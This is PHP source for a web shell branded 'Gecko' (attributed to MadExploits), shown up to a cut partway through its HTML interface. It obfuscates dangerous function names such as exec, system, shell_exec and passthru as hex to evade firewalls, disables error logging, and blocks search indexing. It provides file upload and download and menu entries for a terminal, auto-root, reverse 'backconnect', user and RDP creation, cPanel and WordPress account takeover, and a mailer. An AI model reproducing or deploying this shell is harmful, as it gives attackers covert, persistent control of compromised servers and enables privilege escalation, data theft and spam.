<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
# function WAF

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <script src="https://kit.fontawesome.com/057b9b510c.js" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
            .code-editor-container {
                height: 85vh !important;
            }

            .CodeMirror {
                height: 72vh !important;
                font-size: xx-large !important;
                margin: 0 4px;
                border-radius: 4px;
            }

            .btn-modal-close {
                padding: 15px 40px !important;
            }
        }

        .btn-submit,
        a {
            text-decoration: none;
            color: #fff
        }

        a,
        body {
            color: #fff
        }

        .btn-submit,
        .form-file,
        tbody tr:nth-child(2n) {
            background-color: #22242d
        }

        .code-editor,
        .modal,
        .terminal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0
        }

        .code-editor-body textarea,
        .terminal-body textarea {
            width: 98.5%;
            height: 400px;
            font-size: smaller;
            resize: none
        }

        .menu-tools li,
        .terminal-body li,
        .terminal-head li {
            display: inline-block
        }

        body {
            background-color: #0e0f17;
            font-family: monospace
        }

        .btn-modal-close:hover,
        .btn-submit:hover,
        .menu-file-manager ul,
        .path-pwd,
        thead {
            background-color: #2e313d
        }

        ul {
            list-style: none
        }

        .menu-header li {
            padding: 5px 0
        }

        .menu-header ul li {
            font-weight: 700;
            font-style: italic
        }

        .btn-submit {
            padding: 7px 25px;
            border: 2px solid grey;
            border-radius: 4px
        }

        .form-file,
        a:hover {
            color: #c5c8d6
        }

        .btn-submit:hover {
            border: 2px solid #c5c8d6
        }

        .form-upload {
            margin: 10px 0
        }

        .form-file {
            border: 2px solid grey;
            padding: 7px 20px;
            border-radius: 4px
        }

        .menu-tools {
            width: 95%
        }

        .menu-tools li {
            margin: 15px 0
        }

        .menu-file-manager,
        .modal-mail-text {
            margin: 10px 40px
        }

        .menu-file-manager li {
            display: inline-block;
            margin: 15px 20px
        }

        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #fff
        }

        .path-pwd {
            padding: 15px 0;
            margin: 5px 0
        }

        table {
            border-radius: 5px
        }

        thead {
            height: 35px
        }

        tbody tr td {
            padding: 10px 0
        }

        tbody tr td:nth-child(2),
        tbody tr td:nth-child(3),
        tbody tr td:nth-child(4) {
            text-align: center
        }

        ::-webkit-scrollbar {
            width: 16px
        }

        ::-webkit-scrollbar-track {
            background: #0e0f17
        }

        ::-webkit-scrollbar-thumb {
            background: #22242d;
            border: 2px solid #555;
            border-radius: 4px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #555
        }

        ::-webkit-file-upload-button {
            display: none
        }

        .modal {
            display: none;
            z-index: 2;
            width: 100%;
            background-color: rgba(0, 0, 0, .3)
        }

        .modal-container {
            animation-name: modal-pop-out;
            animation-duration: .7s;
            animation-fill-mode: both;
            margin: 10% auto auto;
            border-radius: 10px;
            width: 800px;
            background-color: #f4f4f9
        }

        @keyframes modal-pop-out {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .modal-header {
            color: #000;
            margin-left: 30px;
            padding: 10px
        }

        .modal-body,
        .terminal-head li {
            color: #000
        }

        .modal-create-input {
            width: 700px;
            padding: 10px 5px;
            background-color: #f4f4f9;
            margin: 0 5%;
            border: none;
            border-radius: 4px;
            box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
            border-bottom: 2px solid #0e0f17
        }

        .box-shadow {
            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
        }

        .btn-modal-close {
            background-color: #22242d;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 8px 35px
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after {
            padding: 5px;
            border-radius: 5px;
            margin-left: 110px;
            background-color: #2e313d
        }

        .modal-btn-form {
            margin: 15px 0;
            padding: 10px;
            text-align: right
        }

        .file-size {
            color: orange
        }

        .badge-root::after {
            content: "root";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            border-radius: 4px;
            background-color: red
        }

        .badge-premium::after {
            content: "soon!";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 140px;
            border-radius: 4px;
            background-color: red
        }

        .badge-action-chmod:hover::after,
        .badge-action-download:hover::after,
        .badge-action-editor:hover::after,
        .badge-linux::after,
        .badge-windows::after {
            width: 60px;
            text-align: center;
            margin-top: -30px;
            display: block;
            position: absolute
        }

        .badge-windows::after {
            background-color: orange;
            color: #000;
            margin-left: 100px;
            border-radius: 4px;
            content: "windows"
        }

        .badge-linux::after {
            margin-left: 100px;
            border-radius: 4px;
            background-color: #0047a3;
            content: "linux"
        }

        .badge-action-editor:hover::after {
            content: "Rename"
        }

        .badge-action-chmod:hover::after {
            content: "Chmod"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }

        .CodeMirror {
            height: 70vh;
        }

        .code-editor,
        .terminal {
            background-color: rgba(0, 0, 0, .3);
            width: 100%
        }

        .code-editor-container {
            background-color: #f4f4f9;
            color: #000;
            width: 90%;
            height: 90vh;
            margin: 20px auto auto;
            border-radius: 10px
        }

        .code-editor-head {
            padding: 15px;
            font-weight: 700
        }

        .terminal-container {
            animation: .5s both modal-pop-out;
            width: 90%;
            background-color: #f4f4f9;
            margin: 25px auto auto;
            color: #000;
            border-radius: 4px
        }

        .bc-gecko,
        .mail,
        .terminal-input {
            background-color: #22242d;
            color: #fff
        }

        .terminal-head {
            padding: 8px
        }

        .terminal-head li a {
            color: #000;
            position: absolute;
            right: 0;
            margin-right: 110px;
            font-weight: 700;
            margin-top: -20px;
            font-size: 25px;
            padding: 1px 10px
        }

        .terminal-body textarea {
            margin: 4px;
            background-color: #22242d;
            color: #29db12;
            border-radius: 4px
        }

        .active {
            display: block
        }

        .terminal-input {
            width: 500px;
            padding: 6px;
            border: 1px solid #22242d;
            border-radius: 4px;
            margin: 5px 0
        }

        .bc-gecko {
            border: none;
            padding: 7px 10px;
            width: 712px;
            border-radius: 5px;
            margin: 15px 40px
        }

        .mail {
            width: 705px;
            resize: none;
            height: 100px
        }

        .logo-gecko {
            position: absolute;
            top: -90px;
            right: 40px;
            z-index: -1;
            bottom: 0
        }
    </style>
</head>

<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Backdoor Destroyer</a></li>
            <li><a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit"><i class="fa-solid fa-flask"></i> Linux Exploit</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
            <li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
            <li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
            <li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> PHP Mailer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
            <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
        </ul>
    </div>

    <?php

    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <ul>
            <li><a href="" id="create_folder">+ Create Folder</a></li>
            <li><a href="" id="create_file">+ Create File</a></li>
        </ul>
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . ' / ' . '</a>';
            }
            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
        </div>
        </ul>
        <table style="width: 100%;">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <form action="" method="post">
                <tbody>
                    <!-- Gecko Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-ope
